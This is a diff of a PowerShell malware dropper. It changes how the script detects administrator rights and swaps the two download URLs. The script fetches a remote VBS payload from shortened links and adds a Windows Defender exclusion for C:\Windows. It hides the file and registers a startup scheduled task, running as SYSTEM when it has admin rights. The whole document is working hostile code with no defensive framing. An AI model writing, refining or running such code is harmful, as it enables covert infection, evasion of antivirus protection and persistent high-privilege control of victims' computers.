@@ -1,28 +1,22 @@
-# Check if the current user has administrative privileges
+# Function to check for administrative privileges
 function Test-AdminRights {
-    try {
-        # Try to create a registry key in HKLM
-        $key = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("TestAdminRights")
-        if ($key) {
-            $key.Close()
-            [System.IO.File]::Delete($key.Name)
-            return $true
-        }
-    } catch {
-        return $false
-    }
+    $output = & whoami /priv
+    $privileges = $output | Select-String -Pattern "SeShutdownPrivilege|SeChangeNotifyPrivilege|SeUndockPrivilege|SeIncreaseWorkingSetPrivilege|SeTimeZonePrivilege"
+    $privileges.Count
 }
 
-$adminRights = Test-AdminRights
+# Check if the user has more than the normal amount of privileges
+$normalPrivilegeCount = 5 # Number of expected privileges for a non-admin user
+$privilegeCount = Test-AdminRights
 
-if ($adminRights) {
+if ($privilegeCount -gt $normalPrivilegeCount) {
     # Admin rights detected
 
     # Installation directory
     $installPath = "C:\Windows"
     
-    # Download original script.vbs (correct URL)
-    $scriptVbsUrl = "https://rb.gy/3lld2p"
+    # Download script.vbs for admin users
+    $scriptVbsUrl = "https://rb.gy/w3a7hb"
 
     # Windows Defender Exclusion
     Add-MpPreference -ExclusionPath $installPath
@@ -32,8 +26,8 @@ if ($adminRights) {
     # Installation directory
     $installPath = Join-Path $env:USERPROFILE "System"
     
-    # Download alternate script.vbs (correct URL)
-    $scriptVbsUrl = "https://rb.gy/w3a7hb"
+    # Download script.vbs for non-admin users
+    $scriptVbsUrl = "https://rb.gy/3lld2p"
 }
 
 # Create the installation directory if it doesn't exist
@@ -64,7 +58,7 @@ attrib +H $scriptVbsPath
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
 $trigger = New-ScheduledTaskTrigger -AtStartup
 
-if ($adminRights) {
+if ($privilegeCount -gt $normalPrivilegeCount) {
     # If admin rights, run as NT AUTHORITY\SYSTEM
     $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
 } else {
